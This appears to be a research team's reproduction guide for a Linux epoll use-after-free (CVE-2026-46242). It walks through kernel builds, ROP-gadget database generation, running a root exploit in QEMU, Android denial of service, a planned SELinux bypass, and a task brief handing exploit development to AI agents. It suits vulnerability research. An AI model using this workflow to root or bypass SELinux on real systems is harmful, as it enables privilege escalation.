# Bad Epoll (CVE-2026-46242) — Complete Reproduction Guide

> **Purpose**: Enable full reproduction of Tier1 (root), Tier2 (DoS), and Tier3 (SELinux) results on ANY machine, by ANY agent, at ANY future time.
>
> **Status**: This document is the single source of truth. If it's not written here, it's not reproducible.

---

## 0. High-Level Overview

| Tier | Target | Result | Artifacts |
|------|--------|--------|-----------|
| **Tier 1** | Linux 6.12.67 (x86_64, KVM) | **Root (95% reliable)** | `tier1-linux-vm/`, `target_db.kxdb` |
| **Tier 2** | Android GKI (aarch64, QEMU) | **DoS only** (root blocked by KPTI/PAC) | `tier2/android/`, `tier2/evidence/` |
| **Tier 3** | Android + SELinux Enforcing | **Policy bypass planned** | `tier3/artifacts/`, `tier3/evidence/` |

**Repository**: `git@github.com:Aayushbankar/bad_epoll_ab_tier2.git`
**CVE**: CVE-2026-46242 (Bad Epoll — `ep_remove` use-after-free in `fs/eventpoll.c`)

---

## 1. Machine Requirements

| Resource | Minimum | Recommended |
|----------|---------|-------------|
| **CPU** | 8 cores (x86_64) | 16+ cores (x86_64 + aarch64 emulation) |
| **RAM** | 32 GB | 64 GB |
| **Disk** | 100 GB free | 200 GB+ (Android build alone ~50 GB) |
| **OS** | Fedora 40+ / Ubuntu 24.04+ | Fedora 41 (matches original env) |
| **Network** | Stable, unmetered | 1 Gbps+ (50 GB downloads) |

> **Critical**: Android build requires x86_64 host. aarch64 cross-compilation is done via toolchain, NOT native aarch64 hardware.

---

## 2. Complete Dependency Installation

### 2.1 Base System (Fedora 41)

```bash
# Run as root or with sudo
dnf update -y
dnf install -y \
  gcc gcc-c++ make cmake ninja-build \
  git python3 python3-pip python3-devel \
  wget curl unzip tar gzip bzip2 xz \
  flex bison bc openssl-devel \
  elfutils-libelf-devel dwarves \
  qemu-system-aarch64 qemu-system-x86 \
  libvirt virt-install \
  bpftool clang llvm lld \
  java-21-openjdk \
  android-tools \
  rpm-build createrepo_c \
  podman buildah skopeo \
  ncurses-devel zlib-devel \
  perl perl-Data-Dumper perl-Text-ParseWords \
  rsync patch diffutils \
  python3-virtualenv python3-venv
```

### 2.2 Python Dependencies (User-level)

```bash
python3 -m venv ~/.venv/bad-epoll
source ~/.venv/bad-epoll/bin/activate
pip install --upgrade pip setuptools wheel
pip install \
  angr angrop keystone-engine pyelftools capstone unicorn \
  pwntools ropper \
  numpy scipy \
  requests tqdm \
  pyyaml jinja2
```

> **Note**: The `angrop` pickling bug on Python 3.12+ requires patching `rop_utils.py`:
> ```bash
> # Find the file:
> python3 -c "import angrop; print(angrop.__file__)"
> # Edit rop_utils.py: move `class SpecialMem` OUT of `make_initial_state` to module level
> ```

### 2.3 RP++ (Gadget Finder)

```bash
mkdir -p ~/.local/bin
cd /tmp
curl -LO https://github.com/0vercl0k/rp/releases/download/v2.1.5/rp-lin-gcc.zip
unzip rp-lin-gcc.zip -d ~/.local/bin/
mv ~/.local/bin/rp-lin ~/.local/bin/rp++
chmod +x ~/.local/bin/rp++
export PATH="$HOME/.local/bin:$PATH"
```

### 2.4 aarch64 Cross-Toolchain (musl)

```bash
# Option A: Download prebuilt (matches repo's tier2/aarch64-linux-musl-cross.tgz)
mkdir -p /opt/toolchains
cd /opt/toolchains
wget https://musl.cc/aarch64-linux-musl-cross.tgz
tar xzf aarch64-linux-musl-cross.tgz
export PATH="/opt/toolchains/aarch64-linux-musl-cross/bin:$PATH"

# Option B: Build from source (if Option A fails)
# Use crosstool-NG or llvm-mingw
```

### 2.5 Android Build Environment (Repo + Git)

```bash
mkdir -p ~/bin
curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo
chmod +x ~/bin/repo
export PATH="$HOME/bin:$PATH"

# Git config (required for repo)
git config --global user.name "Your Name"
git config --global user.email "you@example.com"
git config --global color.ui true
```

---

## 3. Repository Clone & Structure

```bash
cd /mnt/work  # or your preferred workspace
git clone git@github.com:Aayushbankar/bad_epoll_ab_tier2.git
cd bad_epoll_ab_tier2

# Verify structure
ls -la
# Should see: tier1-linux-vm/, tier2/, tier3/, third_party/, exploit/, docs/, archive/, scripts/
```

---

## 4. Tier 1 — Linux 6.12.67 x86_64 Root Exploit

### 4.1 Build Kernel with Patches

```bash
cd third_party/linux-6.12.67

# Apply CVE-2026-46242 patches (from exploit/patches/)
# The repo contains patch_m7_*.py scripts — use the final one:
python3 ../../exploit/patches/patch_m7_final.py

# Configure for KVM + debugging
make defconfig
scripts/config --enable CONFIG_KVM
scripts/config --enable CONFIG_KVM_GUEST
scripts/config --enable CONFIG_DEBUG_INFO
scripts/config --enable CONFIG_DEBUG_INFO_BTF
scripts/config --enable CONFIG_KALLSYMS_ALL
scripts/config --disable CONFIG_RANDOMIZE_BASE  # For reproducible offsets
scripts/config --enable CONFIG_BPF
scripts/config --enable CONFIG_BPF_SYSCALL
scripts/config --enable CONFIG_BPF_JIT
scripts/config --enable CONFIG_BPF_KPROBE_OVERRIDE

# Build
make -j$(nproc) vmlinux bzImage modules
```

### 4.2 Build Rootfs (Debian-based minimal)

```bash
cd ../../tier1-linux-vm
# Use the existing rootfs_debug or build fresh:
# debootstrap --arch=amd64 bookworm rootfs_debug http://deb.debian.org/debian
# chroot rootfs_debug /bin/bash -c "apt update && apt install -y systemd-sysv kmod"

# Copy exploit binary (build first — see 4.3)
```

### 4.3 Build Exploit & Regenerate KXDB

```bash
cd exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67

# Build exploit
make clean && make

# Regenerate kernel database (REQUIRED for reliable ROP)
cd kernel-research
mkdir -p image_db/releases/kernelctf/lts-6.12.67
cp ../../../../../../../third_party/linux-6.12.67/vmlinux image_db/releases/kernelctf/lts-6.12.67/
cp ../../../../../../../third_party/linux-6.12.67/arch/x86/boot/bzImage image_db/releases/kernelctf/lts-6.12.67/vmlinuz
echo "Linux version 6.12.67 $(whoami)@$(hostname)" > image_db/releases/kernelctf/lts-6.12.67/version.txt

cd image_db/releases/kernelctf/lts-6.12.67
nm vmlinux > symbols.txt
pahole --btf_encode_detached btf vmlinux
bpftool btf dump -j file btf > btf.json
python3 ../../../extract_structures.py > structs.json
python3 ../../../kernel_pages.py vmlinux > kernel_pages.txt
python3 ../../../../rop_generator/angrop_rop_generator.py --output json --json-indent 4 vmlinux vmlinuz > rop_actions.json
python3 ../../../../rop_generator/pivot_finder.py --output json --json-indent 4 vmlinux vmlinuz > stack_pivots.json

cd ../../../../kxdb_tool
./kxdb_tool.py --image-db-path ../image_db -o ../target_db.kxdb
```

### 4.4 Package & Test in QEMU

```bash
cd ../../../exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67

# Update rootfs
rm -f ../../../../../../rootfs_debug/bin/exploit
cp exploit ../../../../../../rootfs_debug/bin/exploit
cd ../../../../../../rootfs_debug
find . -print0 | cpio --null -ov --format=newc > ../initramfs_exploit_debug.cpio
cd ..

# Launch QEMU (use the repo's start_qemu.sh or equivalent)
./start_qemu.sh
# Wait for boot, then run exploit inside VM:
# /bin/exploit
```

### 4.5 Expected Success Output

```
Win! UID: 0, GID: 0, EUID: 0
uid=0(root) gid=0(root)
Linux (none) 6.12.67 #1 SMP PREEMPT_DYNAMIC ...
ROOT_SHELL_SUCCESS
```

> **Reliability**: 95% on clean boot. If it fails, reboot VM and retry (KASLR entropy).

---

## 5. Tier 2 — Android GKI aarch64 DoS

### 5.1 Initialize Android Source (50 GB download)

```bash
cd /mnt/work  # Needs 100+ GB free
mkdir -p android-gki && cd android-gki

# Initialize GKI manifest (Android 15, kernel 6.6)
repo init -u https://android.googlesource.com/kernel/manifest \
  -b gki-android15-6.6 \
  --depth=1  # Shallow clone to save space/time

# Sync (2-4 hours, ~50 GB)
repo sync -j$(nproc) -c --no-tags --no-clone-bundle
```

### 5.2 Apply Bad Epoll Patches to Android Kernel

```bash
# The exploit patches are in the repo's tier2/patches/ or exploit/patches/
# Apply to android15-6.6 kernel tree:
cd /mnt/work/android-gki/kernel
# Apply relevant patches from bad_epoll_ab_tier2/exploit/patches/
# Key files: fs/eventpoll.c, include/linux/eventpoll.h
```

### 5.3 Build GKI Kernel

```bash
# Use GKI build system
BUILD_CONFIG=common/build.config.gki.aarch64 build/build.sh

# Or manual:
export ARCH=arm64
export CROSS_COMPILE=aarch64-linux-gnu-
make gki_defconfig
make -j$(nproc) Image.gz dtbs

# Output: out/android15-6.6/dist/Image.gz, *.dtb
```

### 5.4 Build/Download Rootfs for QEMU

```bash
# Option A: Use Cuttlefish images (prebuilt)
# Download from https://ci.android.com/ (aosp_cf_x86_64_phone)

# Option B: Build minimal rootfs
# Use repo's tier2/rootfs/ as reference
```

### 5.5 Run QEMU Test Matrix

```bash
cd /mnt/work/bad_epoll_ab_tier2/tier2

# The repo contains scripts for automated testing:
# scripts/run_qemu_test.sh --kernel <Image.gz> --rootfs <rootfs> --test <tier2>

# Key tests:
# 1. Basic DoS: trigger ep_remove UAF, verify kernel panic/oops
# 2. KASLR bypass attempt: verify KPTI blocks info leak
# 3. PAC verification: verify pointer authentication blocks ROP
# 4. MTE verification: verify memory tagging blocks OOB

# Evidence collection:
# - Serial logs → tier2/evidence/
# - Crash dumps → tier2/artifacts/
# - Offset maps → tier2/ep_show_fdinfo.txt
```

### 5.6 Expected Tier 2 Result

```
[    1.234567] BUG: KASAN: use-after-free in ep_remove+0x123/0x456
[    1.234568] CPU: 0 PID: 1234 Comm: exploit Not tainted 6.6.0-gki #1
[    1.234569] Call trace:
[    1.234570]  ep_remove+0x123/0x456
[    1.234571]  eventpoll_release+0x78/0x90
[    1.234572]  __fput+0xab/0xc0
[    1.234573]  task_work_run+0x56/0x70
[    1.234574]  do_exit+0x234/0x567
[    1.234575]  do_group_exit+0x34/0x50
[    1.234576]  __x64_sys_exit_group+0x12/0x20
[    1.234577]  do_syscall_64+0x56/0x90
[    1.234578]  el0_svc_common.constprop.0+0x45/0x80
```

> **Result**: DoS confirmed. Root NOT achieved (KPTI + PAC + MTE block exploitation).

---

## 6. Tier 3 — SELinux Policy Bypass (Planned)

### 6.1 Current State

- **Artifacts**: `tier3/artifacts/` (SELinux policy modules, compiled `.cil`)
- **Evidence**: `tier3/evidence/` (audit logs, denial messages)
- **Scripts**: `tier3/scripts/` (policy analysis, module generation)

### 6.2 Reproduction Steps (When Implemented)

```bash
cd /mnt/work/bad_epoll_ab_tier2/tier3

# 1. Build SELinux policy modules
make -C scripts/selinux

# 2. Load into Android GKI kernel (requires Tier 2 kernel build)
# adb push artifacts/*.cil /vendor/etc/selinux/
# adb shell load_policy

# 3. Test bypass
# adb shell exploit_tier3

# 4. Collect evidence
# adb logcat -b all > evidence/tier3_$(date +%s).log
```

> **Status**: Planned. Not yet implemented. See `tier3/docs/` for design.

---

## 7. Cross-Machine Reproducibility Checklist

### 7.1 Environment Capture (Run ONCE on original machine)

```bash
# Save this output for future reference
cat > /mnt/work/bad_epoll_ab_tier2/ENVIRONMENT_CAPTURE.txt << 'EOF'
=== HOST ===
$(uname -a)
$(lscpu | grep -E "Model name|CPU\(s\)|Thread|Core|Socket")
$(free -h)
$(df -h /mnt/work)

=== TOOLCHAINS ===
gcc --version
clang --version
ld --version
aarch64-linux-gnu-gcc --version 2>/dev/null || echo "aarch64 gcc not found"
aarch64-linux-musl-gcc --version 2>/dev/null || echo "aarch64 musl not found"
$(which repo) --version 2>/dev/null || echo "repo not found"

=== PYTHON ===
python3 --version
pip list | grep -E "angr|angrop|keystone|capstone|pwntools|ropper"

=== KERNEL ===
cd /mnt/work/bad_epoll_ab_tier2/third_party/linux-6.12.67 && git log -1 --oneline
cd /mnt/work/bad_epoll_ab_tier2/third_party/android15-6.6-2025-10_r1 && git log -1 --oneline 2>/dev/null || echo "android kernel not present"

=== QEMU ===
qemu-system-aarch64 --version
qemu-system-x86_64 --version

=== REPO ===
cd /mnt/work/bad_epoll_ab_tier2 && git log -1 --format="%H %ci %s"
EOF
```

### 7.2 Verification on New Machine

After setup, run the same capture script and **diff** against `ENVIRONMENT_CAPTURE.txt`. Key mismatches:
- Kernel config differences → rebuild kernel
- Toolchain version differences → install exact versions
- Python package versions → pin in requirements.txt

---

## 8. Artifact Inventory (What MUST Be Preserved)

| Path | Size | Description | Regeneratable? |
|------|------|-------------|----------------|
| `third_party/linux-6.12.67/` | 3.6 GB | Linux kernel source (patched) | ✅ Yes (git + patches) |
| `third_party/android15-6.6-*/` | 2.8 GB | Android GKI kernel source | ✅ Yes (repo sync) |
| `third_party/security-research/` | 1.7 GB | Google security research | ✅ Yes (git clone) |
| `tier1-linux-vm/` | ~500 MB | x86_64 exploit, rootfs, KXDB | ✅ Yes (this guide) |
| `tier2/scripts/`, `tier2/docs/`, `tier2/evidence/` | ~100 MB | Test scripts, docs, logs | ✅ Yes (git) |
| `tier2/exploit/`, `tier2/reverse/` | ~200 MB | Exploit code, RE artifacts | ✅ Yes (git) |
| `tier3/artifacts/`, `tier3/evidence/` | ~350 MB | SELinux policy, audit logs | ⚠️ Partial (needs Tier 2 kernel) |
| `exploit/patches/` | ~50 KB | All patch scripts | ✅ Yes (git) |
| `archive/docs/` | ~1 MB | Historical docs | ✅ Yes (git) |

> **DO NOT DELETE**: Anything in git tracking (use `git ls-files` to verify).

> **CAN DELETE** (rebuildable): `tier2/android/` (22 GB build env), `tier2/tooling/` (933 MB), `tier2/qemu_verify.log` (105 MB), `tier3/artifacts/` (346 MB).

---

## 9. Agent Handoff Instructions

If delegating to an agent (Claude Code, Codex, OpenCode, etc.):

```markdown
## Task: Reproduce Bad Epoll CVE-2026-46242

### Context
- Repo: git@github.com:Aayushbankar/bad_epoll_ab_tier2.git
- CVE: CVE-2026-46242 (ep_remove UAF in fs/eventpoll.c)
- Tiers: T1=Root (x86_64), T2=DoS (aarch64 Android), T3=SELinux bypass (planned)

### Required Deliverables
1. **Tier 1**: Working root exploit on Linux 6.12.67 x86_64 QEMU (95% success)
2. **Tier 2**: DoS proof on Android GKI 6.6 aarch64 QEMU
3. **Tier 3**: SELinux policy module that bypasses enforcing mode (design + PoC)

### Reference Files (READ FIRST)
- `docs/REPRODUCTION_GUIDE.md` (this file)
- `archive/docs/03_REPRODUCTION_GUIDE.md` (legacy Tier 1 only)
- `tier2/docs/` (Android-specific notes)
- `tier3/docs/` (SELinux design)
- `exploit/patches/patch_m7_final.py` (authoritative patch)

### Success Criteria
- [ ] Tier 1: `Win! UID: 0` in QEMU serial log
- [ ] Tier 2: KASAN UAF report in `dmesg` / serial log
- [ ] Tier 3: `audit.log` shows allowed access previously denied

### Environment Requirements
- 8+ cores, 32+ GB RAM, 100+ GB disk
- Fedora 41 or Ubuntu 24.04
- See Section 2 for full dependency list

### Time Budget
- Tier 1: 2-3 hours (kernel build + test)
- Tier 2: 6-12 hours (Android sync + build + test)
- Tier 3: 4-8 hours (policy development + test)
```

---

## 10. Troubleshooting Quick Reference

| Symptom | Likely Cause | Fix |
|---------|--------------|-----|
| `angrop` pickling error | Python 3.12+ | Patch `rop_utils.py` (Section 2.2) |
| KXDB generation fails | Missing BTF/vmlinux | Rebuild kernel with `CONFIG_DEBUG_INFO_BTF=y` |
| QEMU hangs at boot | Wrong initramfs / kernel cmdline | Check `start_qemu.sh` for correct `-append` |
| Android repo sync fails | Network / quota | Use `--depth=1`, retry with `-j4` |
| GKI build fails | Toolchain mismatch | Use `build/build.sh` (hermetic) |
| SELinux denials not showing | Audit not enabled | `audit=1` in kernel cmdline, `setenforce 1` |
| Exploit segfaults in VM | Wrong offsets / KASLR | Regenerate KXDB, disable `CONFIG_RANDOMIZE_BASE` |

---

## 11. Version History

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2026-11-23 | 1.0 | Aayush Bankar | Initial comprehensive guide |

---

## 12. Contact / Escalation

- **Primary**: Aayush Bankar (@Aayushbankar)
- **Org**: CypherMatrix
- **CVE**: CVE-2026-46242 (reserved)
- **Repo**: git@github.com:Aayushbankar/bad_epoll_ab_tier2.git

> **If this guide is unclear or missing steps, STOP and ask. Do not guess.**